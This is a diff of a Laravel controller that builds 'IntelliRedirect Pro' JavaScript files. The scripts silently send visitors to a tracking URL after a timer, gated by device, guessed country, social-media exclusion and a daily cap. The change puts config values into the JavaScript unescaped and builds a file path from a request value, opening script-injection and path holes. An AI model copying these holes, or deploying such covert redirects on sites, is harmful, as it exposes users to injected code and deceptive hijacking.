@@ -127,9 +127,7 @@ class ScriptingController extends Controller
 
         // Create JS file inside public/assets/scripts
         $scriptPath = public_path('assets/scripts/' . $request->domain . '.js');
-        if (!file_exists(public_path('assets/scripts'))) {
-            mkdir(public_path('assets/scripts'), 0755, true);
-        }
+        if (!file_exists(public_path('assets/scripts'))) mkdir(public_path('assets/scripts'), 0755, true);
         file_put_contents($scriptPath, $javascriptScript);
 
         return redirect()->route('admin.script.index')->with('success', 'Script created successfully!');
@@ -137,164 +135,88 @@ class ScriptingController extends Controller
 
     private function generateRedirectionScript($config)
     {
-        // Clean the host URL - remove protocol and www
-        $cleanHost = preg_replace('/^https?:\/\/(www\.)?/', '', $config['host']);
-        $cleanHost = strtolower(trim($cleanHost));
-
-        // Clean main domain similarly
-        $cleanMainDomain = preg_replace('/^https?:\/\/(www\.)?/', '', $config['main_domain']);
-        $cleanMainDomain = strtolower(trim($cleanMainDomain));
-
         $socialMediaSites = json_encode($config['excluded_social_media']);
         $targetDevices = json_encode($config['target_devices']);
         $targetCountries = json_encode($config['target_countries']);
         $offLocation = $config['off_location'] ? 'true' : 'false';
-        $targetWebsites = json_encode([$cleanHost]);
 
         return "// IntelliRedirect Pro - Advanced Redirection System
-        (function() {
-            try {
-                console.log('IntelliRedirect: Script loaded successfully');
-                
-                function initRedirection() {
-                    console.log('IntelliRedirect: Initializing redirection system');
-                    
-                    var targetWebsites = {$targetWebsites};
-                    var redirectTo = \"{$config['tracking_url']}\";
-                    var trackingTime = {$config['tracking_time']};
+            (function() {
+                var targetWebsites = [\"{$config['host']}\"];
 
-                    var excludeSocialMedia = true;
-                    var socialMediaSites = {$socialMediaSites};
-                    var targetDevices = {$targetDevices};
-                    var targetCountries = {$targetCountries};
-                    var dailyLimit = {$config['daily_limit']};
-                    var mainDomain = \"{$cleanMainDomain}\";
-                    var offLocation = {$offLocation};
+                var redirectTo = \"{$config['tracking_url']}\";
+                var trackingTime = {$config['tracking_time']};
 
-                    var currentHostname = window.location.hostname.toLowerCase();
-                    var normalizedHostname = currentHostname.replace(/^www\\./, '');
-                    var isLocalFile = (window.location.protocol === 'file:');
+                var excludeSocialMedia = true;
+                var socialMediaSites = {$socialMediaSites};
+                var targetDevices = {$targetDevices};
+                var targetCountries = {$targetCountries};
+                var dailyLimit = {$config['daily_limit']};
+                var mainDomain = \"{$config['main_domain']}\";
+                var offLocation = {$offLocation};
 
-                    console.log('IntelliRedirect: Current hostname:', normalizedHostname);
-                    console.log('IntelliRedirect: Target websites:', targetWebsites);
+                var currentHostname = window.location.hostname.toLowerCase();
+                var normalizedHostname = currentHostname.replace(/^www\\./, '');
+                var isLocalFile = (window.location.protocol === 'file:');
 
-                    var isTargetWebsite = isLocalFile || targetWebsites.some(function(site) {
-                        return normalizedHostname === site.toLowerCase();
-                    });
-                    
-                    console.log('IntelliRedirect: Is target website?', isTargetWebsite);
-                    if (!isTargetWebsite) {
-                        console.log('IntelliRedirect: Not a target website, exiting');
-                        return;
-                    }
+                var isTargetWebsite = isLocalFile || targetWebsites.some(function(site) {
+                    return normalizedHostname === site.toLowerCase();
+                });
+                if (!isTargetWebsite) return;
 
-                    var isSocialMedia = normalizedHostname && socialMediaSites.some(function(site) {
-                        return normalizedHostname.includes(site.toLowerCase());
-                    });
-                    
-                    console.log('IntelliRedirect: Is social media?', isSocialMedia);
-                    if (excludeSocialMedia && isSocialMedia) {
-                        console.log('IntelliRedirect: Social media excluded, exiting');
-                        return;
-                    }
+                var isSocialMedia = normalizedHostname && socialMediaSites.some(function(site) {
+                    return normalizedHostname.includes(site.toLowerCase());
+                });
+                if (excludeSocialMedia && isSocialMedia) return;
 
-                    var userDevice = getDeviceType();
-                    console.log('IntelliRedirect: User device:', userDevice);
-                    console.log('IntelliRedirect: Target devices:', targetDevices);
-                    
-                    if (targetDevices.indexOf(userDevice) === -1) {
-                        console.log('IntelliRedirect: Device not in target list, exiting');
-                        return;
-                    }
+                var userDevice = getDeviceType();
+                if (targetDevices.indexOf(userDevice) === -1) return;
 
-                    var userCountry = getUserCountry();
-                    console.log('IntelliRedirect: User country:', userCountry);
-                    console.log('IntelliRedirect: Target countries:', targetCountries);
-                    
-                    if (!isLocalFile && targetCountries.length > 0 && targetCountries.indexOf(userCountry) === -1) {
-                        console.log('IntelliRedirect: Country not in target list, exiting');
-                        return;
-                    }
+                var userCountry = getUserCountry();
+                if (!isLocalFile && targetCountries.length > 0 && targetCountries.indexOf(userCountry) === -1) return;
 
-                    if (!isLocalFile && isDailyLimitReached(dailyLimit)) {
-                        console.log('IntelliRedirect: Daily limit reached, exiting');
-                        return;
-                    }
+                if (!isLocalFile && isDailyLimitReached(dailyLimit)) return;
 
-                    // FIXED: offLocation logic - only redirect when NOT on main domain
-                    if (!isLocalFile && offLocation) {
-                        if (normalizedHostname === mainDomain) {
-                            console.log('IntelliRedirect: On main domain, exiting (offLocation enabled)');
-                            return;
-                        } else {
-                            console.log('IntelliRedirect: Off-site location detected, proceeding with redirect');
-                        }
-                    }
+                if (!isLocalFile && offLocation && !isOnTargetLocation()) return;
 
-                    var storageKey = 'visitCount_' + (normalizedHostname || 'localfile');
-                    var visitCount = parseInt(localStorage.getItem(storageKey)) || 0;
-                    visitCount++;
-                    localStorage.setItem(storageKey, visitCount);
-                    
-                    console.log('IntelliRedirect: Visit count:', visitCount);
-                    console.log('IntelliRedirect: Will redirect in', trackingTime, 'seconds to:', redirectTo);
+                var storageKey = 'visitCount_' + (normalizedHostname || 'localfile');
+                var visitCount = parseInt(localStorage.getItem(storageKey)) || 0;
+                visitCount++;
+                localStorage.setItem(storageKey, visitCount);
 
-                    setTimeout(function() {
-                        console.log('IntelliRedirect: Executing redirect now');
-                        if (!isLocalFile) incrementDailyConversions();
-                        window.location.href = redirectTo;
-                    }, trackingTime * 1000);
+                setTimeout(function() {
+                    if (!isLocalFile) incrementDailyConversions();
+                    window.location.href = redirectTo;
+                }, trackingTime * 1000);
 
-                    function getDeviceType() {
-                        var width = window.innerWidth;
-                        if (width <= 768) return 'Mobile';
-                        if (width <= 1024) return 'Tablet';
-                        return 'Desktop';
-                    }
-
-                    function getUserCountry() {
-                        try {
-                            var lang = navigator.language || navigator.userLanguage || 'en-US';
-                            return (lang.split('-')[1] || 'US').toUpperCase();
-                        } catch (error) {
-                            console.log('IntelliRedirect: Error getting country, defaulting to US');
-                            return 'US';
-                        }
-                    }
-
-                    function isDailyLimitReached(limit) {
-                        try {
-                            var today = new Date().toDateString();
-                            var conversions = parseInt(localStorage.getItem('dailyConversions_' + today)) || 0;
-                            return conversions >= limit;
-                        } catch (error) {
-                            console.log('IntelliRedirect: Error checking daily limit');
-                            return false;
-                        }
-                    }
-
-                    function incrementDailyConversions() {
-                        try {
-                            var today = new Date().toDateString();
-                            var conversions = parseInt(localStorage.getItem('dailyConversions_' + today)) || 0;
-                            localStorage.setItem('dailyConversions_' + today, conversions + 1);
-                            console.log('IntelliRedirect: Daily conversions incremented to:', conversions + 1);
-                        } catch (error) {
-                            console.log('IntelliRedirect: Error incrementing daily conversions');
-                        }
-                    }
+                function getDeviceType() {
+                    if (window.innerWidth <= 768) return 'Mobile';
+                    if (window.innerWidth <= 1024) return 'Tablet';
+                    return 'Desktop';
                 }
 
-                // Wait for DOM to be ready
-                if (document.readyState === 'loading') {
-                    document.addEventListener('DOMContentLoaded', initRedirection);
-                } else {
-                    initRedirection();
+                function getUserCountry() {
+                    var lang = navigator.language || navigator.userLanguage || 'en-US';
+                    return (lang.split('-')[1] || 'US').toUpperCase();
                 }
-            } catch (error) {
-                console.error('IntelliRedirect: Critical Error:', error);
-            }
-        })();";
+
+                function isDailyLimitReached(limit) {
+                    var today = new Date().toDateString();
+                    var conversions = parseInt(localStorage.getItem('dailyConversions_' + today)) || 0;
+                    return conversions >= limit;
+                }
+
+                function incrementDailyConversions() {
+                    var today = new Date().toDateString();
+                    var conversions = parseInt(localStorage.getItem('dailyConversions_' + today)) || 0;
+                    localStorage.setItem('dailyConversions_' + today, conversions + 1);
+                }
+
+                function isOnTargetLocation() {
+                    var mainHost = mainDomain.replace(/^https?:\\/\\//, '').replace(/\\/$/, '');
+                    return normalizedHostname === mainHost;
+                }
+            })();";
     }
 
 
